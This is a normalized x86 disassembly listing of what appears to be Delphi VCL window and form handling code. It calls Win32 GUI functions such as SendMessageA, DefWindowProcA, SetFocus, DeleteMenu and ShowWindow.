mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_457a70
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_440afc
push 0x0
mov eax ebx
call sub_443708
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_457ab4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_441280
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_443708
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_443708
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_457b18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_457bc0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457bc7
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov eax edi
call sub_453eac
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403454
mov eax ebx
call sub_457ed0
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403454
test al al
jne r-xdata
sub_457bd0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_4401e4
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_4401e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_457b18
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_457c18
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_457b18
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_457c3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_414088
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413fc0
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_414088
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413fc0
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_457eac
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_443708
mov dx 0xb000
call sub_453c74
test al al
jne r-xdata
call sub_443708
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_453c74
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457eb3
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a90
jmp r-xdata
call sub_403a90
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4401e4
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_443708
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_453c74
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43e0d4
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
call sub_403a90
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_443708
mov dx 0xb01a
call sub_453c74
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a90
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43e0d4
sub_457ed0
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43e0d4
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_443708
push eax
call SetFocus
mov eax ebx
call sub_443708
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_457f20
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43e0d4
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_457fd4
mov eax esi
call sub_457ed0
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_443b30
mov edx eax
mov eax esi
call sub_457b18
sub_457f84
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_456b9c
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43e0d4
mov eax ebx
call sub_456b9c
mov edx esi
call sub_457f84
sub_457fd4
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_451000
mov edx esi
call sub_450fe4
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45807c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_443708
push eax
call SendMessageA
sub_4580c8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45807c
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_4580f8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45807c
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_458164
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41da38
xor eax eax
push ebp
push sub_458212
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41ddac
xor eax eax
push ebp
push sub_4581ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403454
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4581f6
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41ddac
retn
sub_458220
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_456b9c
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_456bd0
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403454
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_4429d0
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_456c1c
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403454
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_4582c0
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_443708
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_443708
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_458148
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_443708
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_441898
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45833e
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41d618
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_4583a0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_443708
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_441b5c
pop edi
pop esi
retn
sub_4583ec
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443708
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_4584e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_456f10
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_4583ec
pop ecx
sub_45851c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43e5f0
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_443708
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443708
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_443708
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43d5c8
pop esi
pop ebx
retn
sub_4585ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_443708
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44295c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_443708
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_450a20
sub_45860c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4419f8
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_450434
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_458658
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_450c94
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_458690
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45872b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458732
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_450394
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d44c
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43a030
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45d44c
jmp r-xdata
sub_458758
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403454
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_458798
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cda0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4587c4
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_457f84
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_439e08
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45881c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_442840
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45be00
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403454
sub_4588a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_443708
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_443708
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_443708
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_458940
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_443708
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_457f20
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403454
sub_458998
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_443c3c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_4589c4
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_457f84
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4589e0
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_4503c4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4503c4
sub_458a20
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_458a58
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403ffc
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_458a8c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_458bdd
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458be4
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_4589e0
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_439dac
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412ae8
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43ca38
lea eax [ ebp - 0x1c ]
call sub_406a10
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_4589e0
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_458a20
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45d0f0
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45d158
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45d158
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_458a58
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412ae8
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43ca38
lea eax [ ebp - 0x1c ]
call sub_406a10
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45d088
test [ esi + 0x228 ] 0x8
je r-xdata
sub_458bec
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_458c60
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
